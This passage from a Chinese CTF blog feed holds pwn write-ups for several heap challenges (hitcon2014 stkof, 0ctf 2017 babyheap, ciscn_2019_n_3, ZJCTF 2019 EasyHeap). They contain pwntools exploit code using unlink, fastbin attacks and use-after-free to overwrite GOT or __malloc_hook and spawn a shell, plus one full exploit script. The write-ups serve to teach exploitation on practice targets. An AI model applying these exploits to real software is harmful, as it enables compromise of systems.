size="4" color="red"><strong>漏洞点，未对size检查</strong></font></li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211705331.bmp"></p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><ul><li>本题目没有后门函数，所以需要我们泄露libc</li><li>开启了PIE,且只有free,add,edit函数可以使用，正常的uaf通过unsortedbin泄露main_arena肯定不行了</li><li>但是我们还有一个unlink，以前都是修改free_got为sysem，现在我们可以将free_got修改为puts_plt，然后调用free就相当于puts_plt，将puts_got写入chunk中，就可以得到libc地址了。</li><li>然后就是正常的修改free_got为system_plt，写入&#x2F;bin&#x2F;sh，然后free就getshell了</li></ul><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h4 id="1-实现unlink"><a href="#1-实现unlink" class="headerlink" title="1.实现unlink"></a>1.实现unlink</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3合并,触发unlink</span></span><br></pre></td></tr></table></figure><ul><li>bss中0x0602140是add函数中s的地址，也是存储chunk的地址，但是之前也说了，我们是先+1再储存chunk地址的，因此chunk1对应于s[1],也就是0x0602140+0x8</li><li>unlink可以使当前储存chunk的地址指向target_addr-0x18，这样改的话会出现下面情况：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903214034468.bmp"></p><h4 id="2-修改free-got为puts-plt，泄露libc"><a href="#2-修改free-got为puts-plt，泄露libc" class="headerlink" title="2.修改free_got为puts_plt，泄露libc"></a>2.修改free_got为puts_plt，泄露libc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><font size="4"><strong>第一个payload:</strong></font></li></ul><p>修改chunk2，其实相当于修改 s-0x18地址的值，修改的是画框部分：</p><p>修改可以参考非栈上格式化字符串所说的A -&gt;B -&gt;C,修改A其实是修改C。</p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/1.bmp"></p><p>往下写0x10垃圾数据，然后填写free_got,puts_got，那么就会出现下面情况：</p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903214655504.bmp"></p><p><font size="4" color="red">这里一定要记住got@plt会自动的指向plt表，也就是说，修改got表到A-B这样的地址结构的时候，会形成A-&gt;GOT@plt-&gt;plt，这样三地址结构，所以我们再次修改A地址为plt才会成功。</font></p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903215051485.bmp"></p><p>成功修改，然后free(2)，2处存储的是puts_plt的地址。</p><h4 id="3-修改free-got为system-然后getshell"><a href="#3-修改free-got为system-然后getshell" class="headerlink" title="3.修改free_got为system,然后getshell"></a>3.修改free_got为system,然后getshell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>没什么说的，和之前一样的。</li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903215311365.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_2017_babyheap--fastbin_attack</title>
      <link href="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/"/>
      <url>/2024/09/03/0ctf-2017-babyheap-fastbin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p><a href="https://buuoj.cn/challenges#0ctf_2017_babyheap">题目链接</a></p><p><a href="https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so">libc.so文件链接</a></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ul><li><font coloe="red">glibc2.24 <strong>fastbin_attack</strong>, <strong>unsortedbin泄露main_arena</strong> ,<strong>Arbitrary Alloc</strong></font></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki (ctf-wiki.org)</a></li></ul><h2 id="题目速览："><a href="#题目速览：" class="headerlink" title="题目速览："></a>题目速览：</h2><ul><li><h5 id="典型的堆菜单题目，但是没有后门函数，system函数也没有"><a href="#典型的堆菜单题目，但是没有后门函数，system函数也没有" class="headerlink" title="典型的堆菜单题目，但是没有后门函数，system函数也没有"></a>典型的堆菜单题目，但是没有后门函数，system函数也没有</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134306228.bmp"></p><ul><li><h5 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134348584.bmp"></p><ul><li><h5 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134416635.bmp"></p><ul><li><h5 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134451923.bmp"></p><ul><li><h5 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134503547.bmp"></p><h3 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h3><ul><li><strong>漏洞点在edit函数，未对size检查，可以实现任意地址写</strong></li><li>题目开启了PIE,unlink直接out，所以想到fastbin_attack,修改malloc_hook为onegagdet。</li><li>先通过unsortedbin泄露main_arena，即可以得到malloc_hook(相差0x10), arbitrary_alloc错位构造fake_chunk，就可以修改malloc_hook为one_gadget</li><li>但是运用arbitrary_alloc需要uaf修改fastbin中chunk的fd指针，因此需要我们两个地址控制同一个chunk，这个手法看下面调试吧。</li></ul><h2 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glibc2.24,泄漏libc,修改__malloc_hook为onegadget</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x00 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x20 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x40 2 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x60 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0x80 4 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fastbins 1-&gt;2</span></span><br></pre></td></tr></table></figure><ul><li>构造五个chunk，chunk0用来溢出chunk1，chunk1，2用于uaf，chunk4用来泄露libc，chunk3溢出修改chunk4</li><li>查看堆布局，看看如何使得两个地址共同控制一个chunk：</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903162751498.bmp"></p><ul><li>由于内存的分页管理机制，我们第一次分配堆地址的最后三位十六进制数肯定为000</li><li>此时我们溢出chunk0修改chunk1的fd指针，也就相当于修改chunk2的地址，此时我们需要利用chunk4,如果将1-&gt;fd所指向的chunk2的地址最后一字节修改为0x80，也就是1-&gt;fd &#x3D; chunk4,此时chunk2会和chunk4联系起来，即<strong>修改chunk2也会修改chunk4</strong>，<strong>也就做到了uaf的利用</strong></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  4--2</span></span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>虽然已经将1-&gt;fd -&gt; 4 ,4和2联系起来了，但是此时的chunk4放在fastbin中肯定是不合适的，因为size不同，在分配chunk的时候size不同是会报错的，所以我们要修改chunk4的size，和chunk1保持一致(在同一个bin中)</li><li>然后将1，2都回收回来，注意虽然1-&gt;fd修改为了chunk4,但是add的函数中for循环从小到大，只要满足”标志位”是0就分配，而chunk2的标志位free之后始终为0。</li><li>然后将chunk4的size修改回来，free(4)，4的fd和bk指针将指向main_arena+0x58,show(2)就将输出这个特殊地址，因为chunk2和chunk4都是指向chunk4的。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 因为2的指针=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 防止和topchunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hook和main_arena差了0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903165642200.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>Arbitrary Alloc 构造fake_chunk</li></ul><p>技巧可以看开头的文章，这里直接演示。</p><ul><li>为了修改malloc_hook为one_gadget，我们要往malloc_hook上面构造fake_chunk，然后直接修改堆中内容即可，来看看malloc_hook上面又没有地方构造吧：</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903170254157.bmp"></p><ul><li>我们发现这个地方可以错位出一个size出来，对应于fastbin[5]（不是很懂可以看开头文章)，这个错位出来的chunk的size是0x60，为了使fastbin中已经存在的chunk-&gt;fd链接上fake_chunk，其size也应该是0x60</li><li>该chunk的地址可以从图上看出：malloc_hook-0x13-0x8(size)-0x8(prev_size)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.23-0ubuntu11.2_amd64.so&quot;</span>)</span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 构造一个位于fastbin的chunk</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 修改chunk2=修改chunk4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6 -&gt; fake_chunk</span></span><br></pre></td></tr></table></figure><ul><li>下图可以发现修改chunk2其实也修改了chunk4</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903171316211.bmp"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><ul><li>然后就很简单了，修改malloc_hook-&gt;one_gadget，再次malloc即可。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x13</span>) + p64(onegadget) <span class="comment"># 从上图看偏移即可</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul><li><p>之前有几次出现了“timeout: the monitored command dumped core”</p></li><li><p>可以看看<a href="https://blog.csdn.net/Lcw_linyx/article/details/124311578">这篇文章</a></p></li><li><p>其实还有一种情况(我也不知道算不算)，我修改了libc.so文件就过了</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_3-uaf</title>
      <link href="/2024/09/02/ciscn-2019-n-3-uaf/"/>
      <url>/2024/09/02/ciscn-2019-n-3-uaf/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-n-3-32位uaf"><a href="#ciscn-2019-n-3-32位uaf" class="headerlink" title="ciscn_2019_n_3(32位uaf)"></a>ciscn_2019_n_3(32位uaf)</h1><p><font size="4"><a href="https://buuoj.cn/challenges#ciscn_2019_n_3">题目链接</a></font></p><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124827761.bmp"></p><ul><li>又是典型的堆菜单题目，但是注意此题是32位的，接着看各个功能块：</li></ul><p><font size="4"><strong>do_new</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124929281.bmp"></p><p><font size="4"><strong>do_del</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124936477.bmp"></p><p><font size="4"><strong>do_dump</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124944351.bmp"></p><p><font size="4"><strong>ask</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124950987.bmp"></p><h3 id="1-1功能块分析"><a href="#1-1功能块分析" class="headerlink" title="1.1功能块分析"></a>1.1功能块分析</h3><ul><li>do_new里面是生成两个chunk(type&#x3D;2)，注意其中第一个chunk，malloc(0xc)，<strong>对于32位来说，他是0x8+0x4，这样malloc的chunk涉及到了prev_size的复用</strong>，下一个chunk的prev_size将会充当上一个chunk的user_data部分，因为prev_size记录上一个chunk是否被利用，没利用记作0，空着不用太浪费了就会被利用，**对应于64位，malloc(0xn0 + 0x8)**。</li><li>prev_size的复用通常会用于off_by_one漏洞利用，但这里没有off_by_one</li><li>do_new中的chunk结构如下：</li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/heap.drawio.png"></p><p><font size="4" color="red">漏洞点就在rec_int_free和do_del里面：</font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902130932374.bmp"></p><p><em><em>do_del以地址执行函数，</em>(record[i]+4)对应的就是rec_int_free函数，record[i]就是指针参数。</em>*</p><ul><li>思路应该很清晰了,和之前一样的，修改free_got -&gt; system_plt，然后往record[i]传入&#x2F;bin&#x2F;sh\x00，进行do_del,就可以getshell，但是此题有点区别，<strong>由于是32位，&#x2F;bin&#x2F;sh\x00有8字节，一个机器字长无法写下，其实这里写入sh\x00\x00也可以getshell。</strong></li><li>如何修改，这里利用了<font color="red"><strong>uaf。</strong></font></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">add</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;bbbb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902131659259.bmp"></p><ul><li><strong>查看堆布局可以明显看出prev_size的复用</strong></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>接着我们free掉0，1，那么这四个chunk都会被free掉，进入fastbins中，然而，free之后它们的指针并未清零，这里就造成了uaf漏洞</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132413024.bmp"></p><ul><li>我们再次malloc，首先就会malloc(0xc)，将record[1]malloc(0xc)给拿走，我们的目的就是修改record处的地址，<strong>那么我们再次malloc(0xc)，系统会将record[0]malloc(0xc)给你，那么我们修改这部分的内容了</strong></li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132856868.bmp"></p><ul><li><font size="4" color="red">下图可以发现record[0]发生了改变</font></li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132909502.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>此时我们free(0)就可以getshell了</li></ul><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27447)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,<span class="built_in">type</span>,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Type &gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>) )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Length &gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路uaf,double_free修改free_got -&gt; system_plt</span></span><br><span class="line"><span class="comment"># 注意32位</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019_EasyHeap-unlink</title>
      <link href="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/"/>
      <url>/2024/09/01/ZJCTF-2019-EasyHeap-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF-2019-EasyHeap-unlink"><a href="#ZJCTF-2019-EasyHeap-unlink" class="headerlink" title="[ZJCTF_2019]EasyHeap-unlink"></a>[ZJCTF_2019]EasyHeap-unlink</h1><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">题目链接</a></p><h2 id="初次分析"><a href="#初次分析" class="headerlink" title="初次分析"></a>初次分析</h2><ul><li>刚开始ida一看，以为和之前的题目一样，就是简单的修改unsortedbin-&gt;bk，然后getflag</li><li>之前的题目讲解：[BUUCTF hitcontraining_magicheap–<a href="https://blog.csdn.net/zwb2603096342/article/details/140345550?spm=1001.2014.3001.5502">Unsorted_bin-＞bk修改]3-CSDN博客</a></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901201439897.bmp"></p><ul><li><font size="4"><strong>l33r是个后门函数</strong></font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901202058454.bmp"></p><ul><li>正常打结果却显示：</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901193853555.bmp"></p><ul><li><font size="4" color="red">所以被后门函数欺骗了！！！</font></li></ul><h2 id="正式分析"><a href="#正式分析" class="headerlink" title="正式分析"></a>正式分析</h2><p>各个功能块就不展示了，可以看开头的博客。</p><ul><li>给了后门函数不可以用，但是提供了systen函数，我们要做的就是往里面传参，与上一篇博客可以说很相似了，<font color="red">先传入&#x2F;bin&#x2F;sh,修改free_got为system_plt,执行free即可</font></li><li>那么如何修改free_got，为了实现这个功能，我们通常有double_free控制同一个chunk，但是这里free后将指针清零了，所以无疑是不可以的，那么我们可以采取unlink，关于unlink可以参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#unlink_2">这篇文章</a></li><li>此题的PIE也没有开，且具有heaparray地址：</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901202849993.bmp"></p><p><font size="4">常规的：</font></p><ul><li><font size="4"><strong>fd -&gt;  heaparray-0x18</strong></font></li><li><font size="4"><strong>bk -&gt; heaparray-0x10</strong></font></li></ul><p><font size="4">还有修改谁的fd，bk跟着gdb调试理解吧</font></p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><ul><li>先生成3个chunk，chunk2防止chunk1在free的时候与top_chunk合并，并且传入&#x2F;bin&#x2F;sh</li><li>此时的堆布局如下</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901203630753.bmp"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>unlink需要构造fake_chunk,然后uaf</li><li><strong>利用chunk0构造一个fake_chunk:</strong></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 伪造chunk0为free_chunk</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>此时堆布局如下，构造的fake_chunk和chunk1合并,红框部分地址应该是main_arena+0x58</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901204855949.bmp"></p><ul><li><font size="4" color="red"><strong>查看heaparray</strong></font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901205436677.bmp"></p><p><font size="4" color="red"><strong>可以很明显的发现，修改chunk0，就是修改heaparray-0x18的值！！</strong></font></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>两个地方都可以修改chunk0，那么就可以先填入free_got,然后修改成system_plt，再free(2)即可：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li><font size="4">第一次edit</font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901210431840.bmp"></p><ul><li><font size="4">第二次edit,发现成功修改了</font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901210501273.bmp"></p><p><font size="4" color>注意：</font></p><p>这里有点像非栈上格式化字符串漏洞一样了，先建立A -&gt; B -&gt;C的结构，然后修改A其实是修改C</p><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" 